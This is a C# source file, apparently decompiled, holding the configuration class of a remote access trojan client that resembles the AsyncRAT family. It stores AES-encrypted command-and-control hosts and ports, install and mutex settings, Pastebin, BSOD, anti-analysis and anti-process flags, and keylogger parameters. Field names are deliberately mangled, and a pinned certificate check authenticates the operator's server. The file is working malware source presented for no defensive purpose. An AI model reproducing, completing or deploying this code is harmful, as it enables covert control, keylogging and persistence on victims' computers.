using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;
using Params;

namespace Client;

public static class Settings
{
	public static KeylogParams keylogparam = new KeylogParams();

	public static string Por_ts = "/GAP9C1xPJ7IlP6MYsj77Kdf7p+qTh5yBvcex4/z/nBOiJFC1G62ZybbX37ftaw+PEw14z6rWvj/HMeiEew8mQ==";

	public static string Hos_ts = "S8l/KKqx5GrcphexFg5i/inDnNVshzTqBK2ADAmqK6huMPrjWvRwLfbsoNH/sUEBUd9hrOB/+uhBx9bPXexpOQ==";

	public static string Ver_sion = "7BCUDc4OlJ/FKROC2UNO6TtO5R+E1kfFgewH/2b0eGWAy07lCeCHgf6lqihscqJetOtS8rUlXwVZcylz7T5Djcm7dJ8GpC/7d9WWd/VaA4rQECxYEbzyZmN18N/j1CYm";

	public static string In_stall = "mxC+WDOE5hhhwCj2kL7RLTtdKp6GJwk2pLXjW9S2HlVXCii4cljhByv7lImKp2LbrwZ4Qz2DsBG46tCOWBxUjQ==";

	public static string Install_Folder = "%AppData%";

	public static string Install_File = "";

	public static string Key = "RHJwOEgybnExMWQzWW9jaEc3THh4dWdKNlpoYml0YUs=";

	public static string MTX = "UJYK6nrIjrDo6JxLjJipLlRDWJEfL/lK09atLcC3IifL+yZHlYpWgWu8Zt3iqVZLzW54l3gaxVHpoDb0uy7awvV+5OrjKnYANv0EIMhiT78=";

	public static string Certifi_cate = "8oioz3V/x/mMjcTC8D6VkDTNBYEY7sYkjVazLmr4Q1YameUZvgHPNGzV66U1XAmTrTB6kiTbeUO3HMlIxjYvANaxpp/Bzte2wRuF3V2YQHlY0Y4l02G3yCpqwsVWf3vrTlL0eiGt+G/qNJ410i1w3XgluPzXdNtkSP/dQyYk0Zs9YzDSOi0vOZyvtZ2NNk6UokAN2SQi09CXt51PF9n7A/EaeNk88ZrTBKMMrvuSp41RoZkeNrHCSZHBPZbjt4S6Gs2Iz+8qFU66pTzHzkYlwiKy91NCFSQzrpUjSM+xtzdMSafBg2KYa5mFIH1X3eG0zQGTNKiym95rsqDDF4vUHAA55ISP2yWOrBcV8VwjHQrnzia7ZFjsgERo31OO4VdNDEJpbkTVYXxhDl2h9xJsla51gUdx9iiAtsLO0WrfWnJknC1Y+r9pJp6ctcNUllhlhKOkOB1ioW6pTzOkxwZ8wpQvzVIhQyx107eN3Be8vSW3lBMV0dMRHxm3hbi8/UScAWpExo1ht4PxQZ8HPBxzr800OZ7DFwYAyRpH9kBKjpBwDnZBWDdLzllRurscn5QGMiE4wgPNSpvmQpK11q64jFR3r8rBGbX7aS0H/IV8h4d02DEgcP1SVog/ZaSPloynednpMlQYDAwvjjyw+pBU0KqXdIvEQgIiqWw7KXTKfM4LBHyUaEhXVIcjViV4y45EXIfky9czZqIr7bLdwEdYFgRxQ7adQSzuAB9WAqu2YuBzac1SXoT576w04S49VNHSH4JL96e1AxD+DO6l2w+06gnFLsgGQSdgR/bHXgPEH2/lNgTqZ42mMSdgrk6SCAUgz+b1GxnwX8B3ZGHv+5ZF0YAtLyq8rUYUXUiKqWc7ui0O2PXD+bfDDfJiRHm6FzNvoYYj0kSCrJw9LpAwXsOvmsAZ5Ol09jhcnzGqbjxEE8a3WYzMDmT90cgu3VV1yuS36t7LWeUJBo9tMjaPpEIrkIvTvPSg554X9h6O05KXxOK5u2qLTYtMxM+VUK3HRTtSVkefJ3k7Z2JTDjbUDfqYzPYbVJXt5Y/PNHCnqyX0/ycS1JOmXN1Thj4/zgDj4DFF";

	public static string Server_signa_ture = "b4HOn9/D0dj0JiD/nCJrPABwXAcLlNYzDmKo6TBdh8w6YaZkHCfRyWUHZYC251vgP7m9XXKtKJRSlii5PiDaoep153RXS0/WTtLy6/Jyr844p1P4xgyDUi1jHmzbh0xgN0g0GNpg5x/BGtAsrgnVeDWQvlcdiR+zUW8Uvemr67IrZTnazOU9+RWFF5Vr/Bty9tLNeayJCYt9fTxpkzIkC9BQfMeHkyiDBRmW5VbYDJlSFTldccbuXfGPi3fYhHgh9vo+eIScP211xJG/2iaZN26UJDYmitFH/sVS49IdQ5s=";

	public static X509Certificate2 Server_Certificate;

	public static Aes256 aes256;

	public static string Paste_bin = "8v6pvSHxeq/qW6K4PiD7GBsf6aU221MpjBRFDhsAyAlsQ8fOnZcPWJPED9Ow0cjNWW2YNWEFDU3+RfdLBFtOyw==";

	public static string BS_OD = "vSX9m+cl7uYCwRs10UY7ayhmCt28Wumv2s+Ac4Pp0LMHas95i/uWQfOMUC0pv7vsNsZiJ8WLzVjzNGroopBzaQ==";

	public static string Hw_id = null;

	public static string De_lay = "1";

	public static string Group = "SoYQ2RTfCJgAQHfslZShZ6R6yFkE6puaRDZHRk8Wos6IE7uJyOR6daO78wU+h34/kmg/ZVcxUgVe37rCXofRSQ==";

	public static string Anti_Process = "YxZupSUUZ5TksYXtKLGseos4fNu+2Tm9r41g0q/lqb5ercV4lYGRrOZkFCWKPDd2svMO/VtiBRgpWtqFF66MBA==";

	public static string An_ti = "wi7iXKqQsnZl0u7+teai87Q4F/Oy9NnFNUun4cq9K8rD8BYUYR9BVNql6ohOWK1twJhMtZxqJHyo/btHXxmtgA==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Por_ts = aes256.Decrypt(Por_ts);
			Hos_ts = aes256.Decrypt(Hos_ts);
			Ver_sion = aes256.Decrypt(Ver_sion);
			In_stall = aes256.Decrypt(In_stall);
			MTX = aes256.Decrypt(MTX);
			Paste_bin = aes256.Decrypt(Paste_bin);
			An_ti = aes256.Decrypt(An_ti);
			Anti_Process = aes256.Decrypt(Anti_Process);
			BS_OD = aes256.Decrypt(BS_OD);
			Group = aes256.Decrypt(Group);
			Hw_id = HwidGen.HWID();
			Server_signa_ture = aes256.Decrypt(Server_signa_ture);
			Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
			using SHA256Managed sHA256Managed = new SHA256Managed();
			return rSACryptoServiceProvider.VerifyHash(sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Server_signa_ture));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
